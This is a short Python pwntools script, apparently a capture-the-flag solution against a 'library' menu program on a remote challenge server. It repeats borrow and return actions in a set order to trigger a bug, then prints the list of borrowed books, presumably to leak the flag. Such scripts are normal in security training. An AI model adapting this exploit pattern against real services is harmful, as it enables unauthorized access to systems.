from pwn import *

LIST_AVAILABLE = 1
LIST_BORROWED = 2
BORROW_BOOK = 3
RETURN_BOOK = 4
EXIT = 5
RANDOM_BOOK_IDX = 2
NULL_BOOK_IDX = 9

REMOTE = True

if REMOTE:
    p = remote('challenges.cs2026.live', 8080)
else:
    p = process('./files/library')

def send_choice(choice):
    p.recv()
    p.sendline(f'{choice}'.encode())

for i in range(16):
    send_choice(BORROW_BOOK)
    if i == RANDOM_BOOK_IDX:
        send_choice(RANDOM_BOOK_IDX)
        send_choice(RETURN_BOOK)
        send_choice(RANDOM_BOOK_IDX)
    else:
        send_choice(9)

send_choice(LIST_BORROWED)
if REMOTE:
    p.recv()
    print(p.recv().decode())
else:
    print(p.recv().decode())
